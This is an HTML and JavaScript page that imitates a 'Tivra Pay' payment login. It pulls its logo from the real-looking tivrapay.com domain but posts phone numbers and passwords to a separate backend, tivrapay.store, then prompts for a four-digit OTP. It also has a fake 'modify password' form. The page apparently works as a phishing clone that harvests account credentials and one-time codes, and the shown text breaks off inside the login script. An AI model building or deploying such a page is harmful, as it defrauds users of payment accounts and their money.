<!DOCTYPE html>
<html lang="en" style="font-size: 44.8px;">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
    <title>Tivra Pay | Secure Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        html, body {
            background-color: #ffffff;
            width: 100%;
            height: 100%;
            overflow-x: hidden;
        }

        #app {
            width: 100%;
            height: 100%;
        }

        /* main container — matches first image (white, centered, simple) */
        main[data-v-6ffee151] {
            height: 100vh;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #ffffff;
            padding: 0 1.2rem;
        }

        /* logo wrapper — exactly as original, uses image from tivrapay */
        div[data-v-6ffee151]:first-child {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 2rem;
            margin-bottom: 1.2rem;
        }

        img.logo {
            width: 70%;
            max-width: 280px;
            height: auto;
            object-fit: contain;
        }

        /* login form container */
        .loginform {
            width: 100%;
            max-width: 380px;
            display: flex;
            flex-direction: column;
        }

        /* input groups — clean bottom border style (like screenshots) */
        .input-field-group {
            background-color: transparent;
            border-bottom: 1.2px solid #e2e8f0;
            display: flex;
            align-items: center;
            padding: 12px 4px;
            margin-bottom: 24px;
            width: 100%;
            transition: border-color 0.2s;
        }

        .input-field-group:focus-within {
            border-bottom-color: #2563eb;
        }

        .field-icon {
            display: flex;
            align-items: center;
            margin-right: 14px;
        }

        .field-icon svg {
            width: 22px;
            height: 22px;
            stroke: #94a3b8;
            stroke-width: 1.5;
            fill: none;
        }

        .input-field-group input {
            border: none;
            background: transparent;
            width: 100%;
            font-size: 17px;
            outline: none;
            color: #1e293b;
            font-weight: 500;
        }

        .input-field-group input::placeholder {
            color: #cbd5e1;
            font-weight: 400;
        }

        /* row for "Save Password" + "Forgot password" */
        .form-utilities {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 15px;
            margin-top: 6px;
            margin-bottom: 36px;
            width: 100%;
            padding: 0 4px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            color: #3b82f6;
            cursor: pointer;
            gap: 8px;
            font-weight: 500;
        }

        .remember-me input {
            appearance: none;
            -webkit-appearance: none;
            width: 18px;
            height: 18px;
            border: 1.8px solid #cbd5e1;
            border-radius: 50%;
            margin: 0;
            outline: none;
            background-color: #ffffff;
            cursor: pointer;
            transition: 0.1s;
        }

        .remember-me input:checked {
            border-color: #3b82f6;
            background-color: #3b82f6;
            box-shadow: inset 0 0 0 2px #ffffff;
        }

        .forgot-pass-link {
            text-decoration: none;
            color: #3b82f6;
            cursor: pointer;
            font-weight: 500;
            font-size: 15px;
        }

        /* login button — rounded, bold, blue gradient (matches original) */
        .submit-btn {
            background-color: #2563eb;
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 14px;
            border-radius: 32px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
            transition: all 0.2s ease;
        }

        .submit-btn:active {
            background-color: #1d4ed8;
            transform: scale(0.98);
        }

        /* policy agreement row */
        .policy-container-box {
            margin-top: auto;
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            padding-top: 20px;
        }

        .agreement-label {
            display: flex;
            align-items: center;
            font-size: 13px;
            color: #475569;
            cursor: pointer;
            gap: 6px;
        }

        .agreement-label input {
            appearance: none;
            -webkit-appearance: none;
            width: 16px;
            height: 16px;
            border: 1.5px solid #2563eb;
            border-radius: 50%;
            background-color: #ffffff;
            position: relative;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .agreement-label input:checked {
            background-color: #2563eb;
            border-color: #2563eb;
        }

        .agreement-label input:checked::after {
            content: '✓';
            position: absolute;
            color: white;
            font-size: 10px;
            font-weight: bold;
        }

        .policy-link {
            color: #2563eb;
            text-decoration: none;
            font-weight: 500;
            margin-left: 2px;
        }

        /* ----- OTP MODAL (light theme, consistent with original) ----- */
        .otp-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.45);
            backdrop-filter: blur(3px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 30000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s ease;
            padding: 24px;
        }

        .otp-modal-overlay.active {
            opacity: 1;
            pointer-events: auto;
        }

        .otp-modal-container {
            background-color: #ffffff;
            width: 100%;
            max-width: 340px;
            border-radius: 28px;
            padding: 28px 20px 32px;
            position: relative;
            text-align: center;
            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.15);
            border: 1px solid #eef2ff;
        }

        .otp-close-btn {
            position: absolute;
            top: 14px;
            right: 18px;
            font-size: 26px;
            color: #94a3b8;
            background: none;
            border: none;
            cursor: pointer;
            line-height: 1;
        }

        .otp-title {
            font-size: 22px;
            font-weight: 600;
            color: #0f172a;
            margin-top: 8px;
            margin-bottom: 8px;
        }

        .otp-subtitle {
            font-size: 14px;
            color: #475569;
            margin-bottom: 28px;
        }

        .otp-input-container {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 24px;
        }

        .otp-box {
            width: 52px;
            height: 56px;
            border: none;
            border-bottom: 2.5px solid #cbd5e1;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            outline: none;
            background: #f8fafc;
            border-radius: 16px;
            color: #0f172a;
        }

        .otp-box:focus {
            border-bottom-color: #2563eb;
            background: #ffffff;
        }

        .otp-timer {
            font-size: 13px;
            color: #64748b;
            margin-top: 8px;
        }

        /* ----- MODIFY PASSWORD MODAL (light, matching original design) ----- */
        .modify-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            z-index: 20000;
            display: none;
            flex-direction: column;
            padding: 20px 24px;
            overflow-y: auto;
        }

        .modify-modal-overlay.active {
            display: flex;
        }

        .modify-header {
            display: flex;
            align-items: center;
            width: 100%;
            position: relative;
            margin-bottom: 20px;
            padding: 8px 0;
        }

        .modify-back-arrow {
            font-size: 28px;
            color: #3b82f6;
            cursor: pointer;
            position: absolute;
            left: 0;
            padding: 6px 12px 6px 0;
            font-weight: 500;
        }

        .modify-header-title {
            font-size: 20px;
            font-weight: 600;
            color: #0f172a;
            width: 100%;
            text-align: center;
        }

        .modify-avatar-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 12px;
            margin-bottom: 36px;
        }

        .modify-avatar-img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background-color: #eff6ff;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 14px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
        }

        .modify-form-title {
            font-size: 17px;
            color: #1e293b;
            font-weight: 500;
        }

        .modify-form-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            flex: 1;
        }

        .modify-row {
            display: flex;
            align-items: center;
            border-bottom: 1.2px solid #e2e8f0;
            padding: 14px 4px;
            margin-bottom: 18px;
            width: 100%;
        }

        .modify-label {
            font-size: 16px;
            color: #334155;
            width: 85px;
            font-weight: 500;
        }

        .modify-input-box {
            border: none;
            outline: none;
            width: 100%;
            font-size: 16px;
            color: #0f172a;
            background: transparent;
            padding: 6px 0;
        }

        .modify-input-box::placeholder {
            color: #cbd5e1;
            font-weight: 400;
        }

        .modify-redirect-link {
            align-self: flex-end;
            color: #2563eb;
            font-size: 14px;
            text-decoration: none;
            margin: 16px 0 28px;
            font-weight: 500;
            cursor: pointer;
        }

        .modify-btn-container {
            margin-top: 8px;
            margin-bottom: 30px;
        }

        .modify-submit-btn {
            background-color: #2563eb;
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 14px;
            border-radius: 32px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(37, 99, 235, 0.2);
            transition: 0.2s;
        }

        .modify-submit-btn:active {
            background-color: #1d4ed8;
            transform: scale(0.98);
        }
    </style>
</head>
<body>

<div id="app">
    <main data-v-6ffee151>
        <!-- Logo area: original image from tivrapay (exactly as original code) -->
        <div>
            <img src="https://web.tivrapay.com/static/images/Login_Logo.png" class="logo" alt="Tivra Pay Logo">
        </div>

        <div class="loginform">
            <form id="loginForm" style="width: 100%; display: flex; flex-direction: column;">
                <!-- Phone input -->
                <div class="input-field-group">
                    <span class="field-icon">
                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
                            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
                            <line x1="12" y1="18" x2="12.01" y2="18"></line>
                        </svg>
                    </span>
                    <input type="tel" id="phoneNumber" placeholder="Enter phone number" autocomplete="off" required>
                </div>

                <!-- Password input -->
                <div class="input-field-group">
                    <span class="field-icon">
                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        </svg>
                    </span>
                    <input type="password" id="password" placeholder="Enter password" required>
                </div>

                <!-- Utilities: Save Password + Forgot Password -->
                <div class="form-utilities">
                    <label class="remember-me">
                        <input type="checkbox" id="save-pwd"> Save Password
                    </label>
                    <span class="forgot-pass-link" id="triggerForgot">Forgot password</span>
                </div>

                <!-- Login Button -->
                <button type="submit" class="submit-btn">Login</button>
            </form>
        </div>

        <!-- Privacy agreement -->
        <div class="policy-container-box">
            <label class="agreement-label">
                <input type="checkbox" id="agreeCheck" required checked> Agree <span class="policy-link">"User Privacy Agreement"</span>
            </label>
        </div>
    </main>
</div>

<!-- OTP Modal (light theme) -->
<div class="otp-modal-overlay" id="otpModal">
    <div class="otp-modal-container">
        <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
        <div class="otp-title">Please enter OTP</div>
        <div class="otp-subtitle" id="otpSentText">OTP sent to user</div>
        <div class="otp-input-container">
            <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp2')" id="otp1">
            <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp3')" id="otp2">
            <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp4')" id="otp3">
            <input type="tel" class="otp-box" maxlength="1" onkeyup="checkAndSubmitOtp(this)" id="otp4">
        </div>
        <div class="otp-timer">Resend in <span id="secondsCount">118</span> seconds</div>
    </div>
</div>

<!-- Modify Password Modal (light, clean) -->
<div class="modify-modal-overlay" id="modifyPasswordModal">
    <div class="modify-header">
        <span class="modify-back-arrow" id="backToLoginBtn">&#10094;</span>
        <span class="modify-header-title">Modify password</span>
    </div>

    <div class="modify-avatar-box">
        <div class="modify-avatar-img">
            <svg width="44" height="44" viewBox="0 0 24 24" fill="none">
                <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="#3b82f6"/>
            </svg>
        </div>
        <div class="modify-form-title">Modify password Form</div>
    </div>

    <div class="modify-form-container">
        <div class="modify-row">
            <span class="modify-label">Phone</span>
            <input type="tel" class="modify-input-box" id="forgotPhone" placeholder="Enter phone number" required>
        </div>
        <div class="modify-row">
            <span class="modify-label">Password</span>
            <input type="password" class="modify-input-box" id="forgotNewPass" placeholder="Enter password" required>
        </div>
        <div class="modify-row">
            <span class="modify-label">Confirm</span>
            <input type="password" class="modify-input-box" id="forgotConfirmPass" placeholder="Password, Again" required>
        </div>

        <span class="modify-redirect-link" id="redirectLoginLink" style="cursor: pointer;">Already have an account, Go login</span>

        <div class="modify-btn-container">
            <button class="modify-submit-btn" id="modifyBtn">Modify</button>
        </div>
    </div>
</div>

<script>
    // ---------- DOM elements ----------
    const loginForm = document.getElementById('loginForm');
    const otpModal = document.getElementById('otpModal');
    const closeOtpBtn = document.getElementById('closeOtpBtn');
    const otpSentText = document.getElementById('otpSentText');
    const secondsCountSpan = document.getElementById('secondsCount');
    
    const triggerForgot = document.getElementById('triggerForgot');
    const modifyPasswordModal = document.getElementById('modifyPasswordModal');
    const backToLoginBtn = document.getElementById('backToLoginBtn');
    const redirectLoginLink = document.getElementById('redirectLoginLink');
    const modifyBtn = document.getElementById('modifyBtn');

    let currentUserId = null;
    let isModifyFlow = false; 

    // SMART BACKEND ROUTING (localhost vs live domain)
    const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
        ? 'http://localhost:6500' 
        : 'https://tivrapay.store';

    // Modal controllers (Forgot password)
    if(triggerForgot) {
        triggerForgot.addEventListener('click', (e) => {
            e.preventDefault();
            modifyPasswordModal.classList.add('active');
        });
    }
    if(backToLoginBtn) { backToLoginBtn.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }
    if(redirectLoginLink) { redirectLoginLink.addEventListener('click', (e) => { e.preventDefault(); modifyPasswordModal.classList.remove('active'); }); }

    // ----- LOGIN SUBMIT (exact original logic) -----
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault(); 
        const phoneNumber = document.getElementById('phoneNumber').value.trim();
        const password = document.getElementById('password').value;
        const isAgreed = document.getElementById('agreeCheck').checked;

        if (!isAgreed) { 
            alert('Please accept User Privacy Agreement.'); 
            return; 
        }
        if (!phoneNumber || !password) {
            alert("Please enter phone number and password");
            return;
        }
        isModifyFlow = false;

        try {
            const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber, password })
            });
            const data = await response.json();
            if (data.success) {
                currentUserId = data.userId; 
                showOtpSection(phoneNumber);
            } else { 
                alert("Server Er
